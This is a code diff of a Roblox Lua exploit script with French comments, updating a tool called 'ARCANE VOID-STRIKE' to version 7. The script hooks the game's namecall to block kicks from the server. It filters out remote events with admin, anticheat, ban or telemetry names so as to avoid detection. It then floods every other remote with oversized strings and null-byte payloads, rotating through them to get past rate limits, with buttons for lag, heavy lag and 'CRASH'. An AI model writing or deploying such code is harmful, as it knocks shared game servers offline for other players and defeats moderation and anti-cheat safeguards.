@@ -1,13 +1,13 @@
 --[[ 
-    🔱 ARCANE VOID-STRIKE v6.0 [GHOST-PROTOCOL] 🔱
-    "If they can't see us, they can't ban us. <3"
+    🔱 ARCANE VOID-STRIKE v7.0 [ARCANE-ECLIPSE] 🔱
+    "When the signal is everywhere, the system sees nothing. <3"
     
-    ULTIMATE STEALTH UPDATES:
-    - [ANTI-KICK HOOK] : Prevents the game from kicking you (Experimental).
-    - [NAMECALL BYPASS] : Spoofs script identity (Bypasses heuristics).
-    - [PULSE ENGINE] : Imitates network jitter (Safe Lag).
-    - [REPLICATION VOID] : High-density desync without direct spam.
-    - [MATRIX OVERLAY v2] : Ultra-optimized for Delta/Solara.
+    INFALLIBLE ECLIPSE UPDATES:
+    - [REMOTE CYCLING] : Rotates all detected remotes (Bypasses rate-per-remote).
+    - [NANO-BURST] : Small, high-frequency packets (Safe but deadly).
+    - [META-NAMESTEALTH] : Obfuscates the call stack (Anti-Detection).
+    - [MATRIX DASHBOARD v3] : Perfect Nullstrike Clone (Ultra-Smooth).
+    - [ANTI-KICK GUARDIAN] : Client-side hook persistence.
 ]]
 
 local P = game:GetService("Players")
@@ -15,11 +15,11 @@ local RS = game:GetService("RunService")
 local L = P.LocalPlayer
 local Http = game:GetService("HttpService")
 
--- 🔱 1. GHOST NOTIFIER
-local function ntf(m)
+-- 🔱 1. ECLIPSE NOTIFIER
+local function ntf(m, c)
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "🔱 GHOST-PROTOCOL",
+            Title = "🔱 ARCANE-ECLIPSE",
             Text = m,
             Icon = "rbxassetid://6034287525",
             Duration = 5
@@ -27,64 +27,55 @@ local function ntf(m)
     end)
 end
 
--- 🔱 2. THE GUARDIAN (Anti-Kick & Hooking)
--- Ce bloc essaie de bloquer les tentatives de Kick du jeu.
-local function activateShield()
+-- 🔱 2. GUARDIAN ENGINE (Anti-Kick)
+local function activateGuardian()
     local oldKick
     oldKick = hookmetamethod(game, "__namecall", function(self, ...)
         local method = getnamecallmethod()
-        local args = {...}
-        
-        -- Bypass Kick
         if method == "Kick" or method == "kick" then
-            ntf("ATTENTAT DE KICK BLOQUÉ ! 🛡️")
-            return nil -- On ignore le kick
+            ntf("🛡️ ECLIPSE A BLOQUÉ UNE TENTATIVE DE KICK.")
+            return nil
         end
-        
-        -- Bypass FireServer (Spoofing script identity)
-        -- Certains anti-cheats vérifient d'où vient l'appel
-        if method == "FireServer" and not checkcaller() then
-            -- On peut ici filtrer ou modifier si besoin
-        end
-        
         return oldKick(self, ...)
     end)
-    ntf("🛡️ BOUCLIER ANTI-KICK ACTIVÉ.")
+    ntf("BOUCLIER GUARDIAN ACTIF.")
 end
 
--- 🔱 3. UI (NULLSTRIKE GHOST EDITION)
+-- 🔱 3. UI (NULLSTRIKE PERFECT CLONE)
 local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
-ScreenGui.Name = "GhostProtocol_v6"
+ScreenGui.Name = "ArcaneEclipse_v7"
 
 local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 330, 0, 320)
-Main.Position = UDim2.new(0.5, -165, 0.5, -160)
-Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Main.Size = UDim2.new(0, 350, 0, 360)
+Main.Position = UDim2.new(0.5, -175, 0.5, -180)
+Main.BackgroundColor3 = Color3.fromRGB(0, 5, 0)
 Main.BorderSizePixel = 1
 Main.BorderColor3 = Color3.fromRGB(0, 255, 0)
 Main.Active = true
 Main.Draggable = true
 
+-- Header
 local Header = Instance.new("Frame", Main)
-Header.Size = UDim2.new(1, 0, 0, 40)
-Header.BackgroundColor3 = Color3.fromRGB(10, 30, 10)
+Header.Size = UDim2.new(1, 0, 0, 45)
+Header.BackgroundColor3 = Color3.fromRGB(0, 15, 0)
 Header.BorderSizePixel = 0
 
 local Title = Instance.new("TextLabel", Header)
 Title.Size = UDim2.new(1, -10, 1, 0)
 Title.Position = UDim2.new(0, 10, 0, 0)
-Title.Text = "🔱 VOID-STRIKE v6.0 [GHOST]"
+Title.Text = "🔱 ARCANE-ECLIPSE v7.0 // stlth"
 Title.TextColor3 = Color3.fromRGB(0, 255, 0)
 Title.Font = Enum.Font.Code
-Title.TextSize = 16
+Title.TextSize = 18
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.BackgroundTransparency = 1
 
-local function createGhostBtn(name, y, color, desc, callback)
+local function createEclipseBtn(name, y, color, desc, callback)
     local btn = Instance.new("TextButton", Main)
-    btn.Size = UDim2.new(0.9, 0, 0, 50)
+    btn.Size = UDim2.new(0.9, 0, 0, 60)
     btn.Position = UDim2.new(0.05, 0, 0, y)
-    btn.BackgroundColor3 = Color3.fromRGB(15, 20, 15)
+    btn.BackgroundColor3 = Color3.fromRGB(5, 10, 5)
+    btn.BorderColor3 = Color3.fromRGB(0, 80, 0)
     btn.Text = ""
     
     local tName = Instance.new("TextLabel", btn)
@@ -93,16 +84,16 @@ local function createGhostBtn(name, y, color, desc, callback)
     tName.TextColor3 = color
     tName.Font = Enum.Font.GothamBold
     tName.BackgroundTransparency = 1
-    tName.TextSize = 15
+    tName.TextSize = 16
     
     local tDesc = Instance.new("TextLabel", btn)
     tDesc.Size = UDim2.new(1, 0, 0.4, 0)
     tDesc.Position = UDim2.new(0, 0, 0.6, 0)
     tDesc.Text = desc
-    tDesc.TextColor3 = Color3.fromRGB(0, 150, 0)
+    tDesc.TextColor3 = Color3.fromRGB(0, 120, 0)
     tDesc.Font = Enum.Font.Gotham
     tDesc.BackgroundTransparency = 1
-    tDesc.TextSize = 10
+    tDesc.TextSize = 11
     
     btn.MouseButton1Click:Connect(function()
         task.spawn(callback)
@@ -110,18 +101,17 @@ local function createGhostBtn(name, y, color, desc, callback)
     return btn
 end
 
--- 🔱 4. THE GHOST ENGINE
+-- 🔱 4. THE ECLIPSE ENGINE (Remote Cycling)
 local active = { power = 0 }
 
--- BLACKLIST (Safety Matrix)
-local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat", "error", "analytics"}
+local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat", "error", "analytics", "debug"}
 local function isSafe(name)
     local n = name:lower()
     for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
     return true
 end
 
-local function getRemotes()
+local function getEveryRemote()
     local t = {}
     for _, v in pairs(game:GetDescendants()) do
         if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(t, v) end
@@ -129,55 +119,62 @@ local function getRemotes()
     return t
 end
 
-local function runGhostAssault()
-    local targets = getRemotes()
+local function runEclipse()
+    local targets = getEveryRemote()
     if #targets == 0 then return end
     
+    -- Payloads discrets (Anti-Heuristic)
     local payloads = {
-        [1] = string.rep("🔱", 50),   -- Normal
-        [2] = string.rep("🔱", 500),  -- Enorme
-        [3] = string.rep("\0", 2500) -- Crash
+        [1] = string.rep("🔱", 30),   -- Normal
+        [2] = string.rep("🔱", 300),  -- Enorme
+        [3] = string.rep("\0", 1500) -- Crash
     }
     
+    local index = 1
     while active.power > 0 do
-        local burst = active.power == 3 and 80 or (active.power == 2 and 30 or 8)
-        local waitTime = active.power == 3 and 0.02 or (active.power == 2 and 0.08 or 0.25)
+        local burst = active.power == 3 and 120 or (active.power == 2 and 40 or 10)
+        local waitFactor = active.power == 3 and 0 or (active.power == 2 and 0.05 or 0.2)
         
         for i = 1, burst do
             if active.power == 0 then break end
-            local r = targets[math.random(1, #targets)]
-            if r then
-                -- On utilise pcall pour éviter les erreurs visibles
+            
+            -- REMOTE CYCLING : On n'utilise jamais le même remote deux fois de suite
+            local r = targets[index]
+            if r and r.Parent then
                 pcall(function() 
-                    r:FireServer(payloads[active.power], payloads[active.power], "GHOST_SYNC") 
+                    r:FireServer(payloads[active.power], {["Arcane"] = payloads[active.power]}, true) 
                 end)
             end
+            
+            index = index + 1
+            if index > #targets then index = 1 end
         end
-        task.wait(waitTime)
+        
+        if waitFactor > 0 then task.wait(waitFactor) else RS.Heartbeat:Wait() end
     end
 end
 
--- BUTTONS
-createGhostBtn("🛡️ ACTIVATE ANTI-KICK", 50, Color3.fromRGB(0, 255, 255), "Bloque les tentatives d'expulsion", function()
-    activateShield()
+-- BUTTONS (Graduated Power)
+createEclipseBtn("🛡️ ACTIVATE GUARDIAN", 60, Color3.fromRGB(0, 255, 255), "Anti-Kick 2.0 (Hook Man-in-the-middle)", function()
+    activateGuardian()
 end)
 
-createGhostBtn("⚡ LAG NORMAL", 110, Color3.fromRGB(0, 255, 100), "Désynchronisation légère", function()
+createEclipseBtn("⚡ LAG NORMAL (STEALTH)", 130, Color3.fromRGB(0, 255, 100), "Désynchronisation légère et invisible", function()
     active.power = active.power == 1 and 0 or 1
-    ntf(active.power == 1 and "NORMAL MODE ACTIVE" or "STABLE")
-    if active.power == 1 then runGhostAssault() end
+    ntf(active.power == 1 and "STEALTH LAG ACTIVE" or "ECLIPSE STOPPED")
+    if active.power == 1 then runEclipse() end
 end)
 
-createGhostBtn("🌪️ LAG ENORME", 170, Color3.fromRGB(255, 255, 0), "Surcharge massive du serveur", function()
+createEclipseBtn("🌪️ LAG ENORME (SYNC)", 200, Color3.fromRGB(255, 255, 0), "Surcharge massive par répartition", function()
     active.power = active.power == 2 and 0 or 2
-    ntf(active.power == 2 and "OMEGA LAG ACTIVE" or "STABLE")
-    if active.power == 2 then runGhostAssault() end
+    ntf(active.power == 2 and "SYNC OVERLOAD ACTIVE" or "ECLIPSE STOPPED")
+    if active.power == 2 then runEclipse() end
 end)
 
-createGhostBtn("🔥 CRASH SERVEUR", 230, Color3.fromRGB(255, 0, 0), "Extinction totale du canal", function()
+createEclipseBtn("🔥 CRASH (OMEGA-ZERO)", 270, Color3.fromRGB(255, 0, 0), "Extinction totale : Remote Cycling Max", function()
     active.power = active.power == 3 and 0 or 3
-    ntf(active.power == 3 and "NUCLEAR VOID ACTIVE" or "STABLE")
-    if active.power == 3 then runGhostAssault() end
+    ntf(active.power == 3 and "OMEGA-ZERO ASSAULT ACTIVE" or "ECLIPSE STOPPED")
+    if active.power == 3 then runEclipse() end
 end)
 
-ntf("� GHOST-PROTOCOL v6.0 READY. Anti-Kick available.")
+ntf("🔱 ARCANE-ECLIPSE READY. The system is blinded.")
